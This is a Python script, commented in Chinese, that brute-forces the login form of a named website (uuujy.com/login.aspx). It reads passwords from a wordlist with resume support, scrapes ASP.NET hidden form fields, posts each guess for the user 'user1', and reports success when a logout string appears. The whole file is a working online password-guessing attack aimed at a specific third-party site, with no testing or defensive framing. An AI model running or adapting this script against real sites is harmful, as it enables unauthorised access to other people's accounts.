#!/usr/bin/python3.4
# -*- coding=utf-8 -*-

import urllib.request
from bs4 import BeautifulSoup
from multiprocessing import Process,Queue

user_thread = 1
username = "user1"
wordlist_file = "cain.txt"
resume = None#如果中途暂停，可以从上次结束的位置恢复

target_url = "http://www.uuujy.com/login.aspx"
target_post = "http://www.uuujy.com/login.aspx"

username_field = "txtUserName"
password_field = "txtPassword"

success_check = "退出登录"

#生成密码字典
def build_wordlist(wordlist_file):
        fd = open(wordlist_file, "rb")
        raw_words = fd.readlines()
        fd.close()

        found_resume = False
        words = Queue()

        for word in raw_words:
                word = word.rstrip()

                if resume is not None:#如果有上次的暂停存在
                        if found_resume:#如果找到了暂停的位置，就继续把密码写入队列
                                words.put(word)
                        else:
                                if word == resume:#如果找到了上次暂停所有在位置的密码
                                        found_resume = True#设置found_resume，后面就从此处往后开始猜测密码
                                        print("Resuming wordlist from: %s" % resume)
                else:
                        words.put(word)#如果没有上次暂停就直接把密码写入队列

        return words

def findHTTPtag(urlContent):
        soup = BeautifulSoup(urlContent, "html.parser")#用bs4分析url返回内容
        Tags = soup.find_all('input')#提取input字段
        tag_results = {}
        for tag in Tags:
        #需要把如下的字段返回给server
        #<input id="__EVENTVALIDATION" name="__EVENTVALIDATION" type="hidden" value="jsFmS8BATLXO264acFg+GRekiBNAKYVZjALiIEheFGVXjzH8oDF46mivwO0JuPqtpxEW3Bx77o+gdnInQuEewOqLwOYUg5CBiJigiUDBQ1t8txv6x8Dwy+aD4Cp2JUxCZ9dfMhTnJmFfmdtml4msYsD1qIyhK1SIpCIOZnzZkuM="/>
        #需要提取name和value的值，产生字典并且返回
                tag_name = None
                tag_value = None
                for name, value in tag.attrs.items():
                        if name == "name":
                                tag_name = value
                        if name == "value":
                                tag_value = value
                        if tag_name is not None:
                                tag_results[tag_name] = tag_value
        return tag_results

class Bruter(object):
        def __init__(self, username, words):
                self.username = username#用户名
                self.password_q = words#密码的队列
                self.found = False

                print("Finished setting up for: %s" % username)

        def web_bruter(self):
                while not self.password_q.empty() and not self.found:#如果队列不为空，并且并没有找到！
                        brute = self.password_q.get().rstrip()#提取密码

                        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor())
                        urllib.request.install_opener(opener)#提取并且分析Cookie

                        urlContent = urllib.request.urlopen(target_post).read()#读取返回信息

                        post_tags = findHTTPtag(urlContent)#把返回信息交给bs4分析，并且得到返回值的字典

                        post_tags[username_field] = self.username
                        post_tags[password_field] = brute

                        login_data = urllib.parse.urlencode(post_tags)#对数据进行编码
                        login_response = opener.open(target_post, login_data.encode())#发送数据
                        login_result = login_response.read()#读取结果

                        if success_check in login_result.decode():#如果成功的结果在回应中被发现
                                self.found = True
                                print("[*] Bruteforce successful.")
                                print("[*] username: %s" % username)
                                print("[*] password: %s" % brute)
                                print("[*] waiting for other threads to exit...")

        def run_bruteforce(self):
                for i in range(user_thread):
                        t = Process(target=self.web_bruter)
                        t.start()

if __name__ == '__main__':
        words = build_wordlist(wordlist_file)
        bruter_obj = Bruter(username, words)
        bruter_obj.run_bruteforce()
